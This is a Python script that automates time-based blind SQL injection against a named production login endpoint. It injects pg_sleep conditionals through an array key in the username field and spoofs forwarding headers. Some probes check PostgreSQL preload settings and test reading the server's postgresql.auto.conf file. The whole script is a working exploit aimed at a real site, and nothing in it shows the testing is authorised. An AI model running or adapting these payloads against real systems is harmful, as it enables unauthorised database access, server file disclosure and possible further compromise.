#!/usr/bin/env python3
from __future__ import annotations
import hashlib, json, os, subprocess, time
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
RUN = os.environ.get('RUN_ID', '2026-11-20T2250Z_prod_github_probe')
OUT = ROOT / 'runs' / RUN
OUT.mkdir(parents=True, exist_ok=True)
URL = 'https://developers.calix.com/index.php?q=user/login&_format=json'
UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36'

def utc():
    return datetime.now(timezone.utc).isoformat(timespec='microseconds').replace('+00:00','Z')

def sha(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()

def post(label: str, key: str, delay: float, timeout: int = 35) -> dict:
    d = OUT / label
    d.mkdir(exist_ok=True)
    body = json.dumps({'name': {'0': 'u1', key: 'a'}, 'pass': 'a'}, separators=(',',':')).encode()
    (d/'request.json').write_bytes(body)
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'User-Agent': UA,
        'X-Forwarded-For': '198.18.248.101',
        'X-Real-IP': '198.18.248.101',
        'Connection': 'close',
    }
    cmd = ['curl','--silent','--show-error','--insecure','--http1.1','--path-as-is',
           '--connect-timeout','10','--max-time',str(timeout),
           '-D',str(d/'response.headers'),'-o',str(d/'response.body'),
           '--trace-ascii',str(d/'trace.txt'),
           '-w','http_code=%{http_code}\nremote_ip=%{remote_ip}\ntime_total=%{time_total}\nsize_download=%{size_download}\n',
           '--data-binary','@'+str(d/'request.json')]
    for k,v in headers.items(): cmd += ['-H',f'{k}: {v}']
    cmd.append(URL)
    started=utc(); t0=time.monotonic(); p=subprocess.run(cmd,text=True,capture_output=True); wall=time.monotonic()-t0; ended=utc()
    (d/'curl.stdout').write_text(p.stdout)
    (d/'curl.stderr').write_text(p.stderr)
    vals={}
    for line in p.stdout.splitlines():
        if '=' in line:
            k,v=line.split('=',1); vals[k]=v
    b=(d/'response.body').read_bytes() if (d/'response.body').exists() else b''
    rec={'label':label,'key':key,'delay':delay,'utc_start':started,'utc_end':ended,
         'curl_exit':p.returncode,'http_status':int(vals['http_code']) if vals.get('http_code','').isdigit() else None,
         'time_total_s':float(vals['time_total']) if vals.get('time_total') else None,
         'remote_ip':vals.get('remote_ip'),'size_download':int(vals['size_download']) if vals.get('size_download','').isdigit() else None,
         'wall_s':round(wall,6),'request_sha256':sha(body),'response_sha256':sha(b),'response_size':len(b),
         'response_preview':b[:500].decode('utf-8','replace')}
    (d/'meta.json').write_text(json.dumps(rec,indent=2,sort_keys=True)+'\n')
    print(json.dumps(rec,sort_keys=True),flush=True)
    return rec

def main():
    recs=[]
    recs.append(post('true_1','0||(SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END)::text',2.0))
    recs.append(post('false_1','0||(SELECT CASE WHEN (1=2) THEN pg_sleep(2) ELSE pg_sleep(0) END)::text',2.0))
    recs.append(post('preload_empty','0||(SELECT CASE WHEN (current_setting(\'session_preload_libraries\')=\'\') THEN pg_sleep(2) ELSE pg_sleep(0) END)::text',2.0))
    recs.append(post('config_original','0||(SELECT CASE WHEN (pg_read_binary_file(\'/var/lib/postgresql/gcsdata/postgresql.auto.conf\',0,1048576,true)=decode(\'2320446f206e6f74206564697420746869732066696c65206d616e75616c6c79210a232049742077696c6c206265206f7665727772697474656e2062792074686520414c5445522053595354454d20636f6d6d616e642e0a\',\'hex\')) THEN pg_sleep(2) ELSE pg_sleep(0) END)::text',2.0))
    result={'run':RUN,'utc_finished':utc(),'records':recs}
    (OUT/'result.json').write_text(json.dumps(result,indent=2,sort_keys=True)+'\n')
    print('RESULT='+str(OUT/'result.json'),flush=True)
    return 0

if __name__ == '__main__':
    raise SystemExit(main())
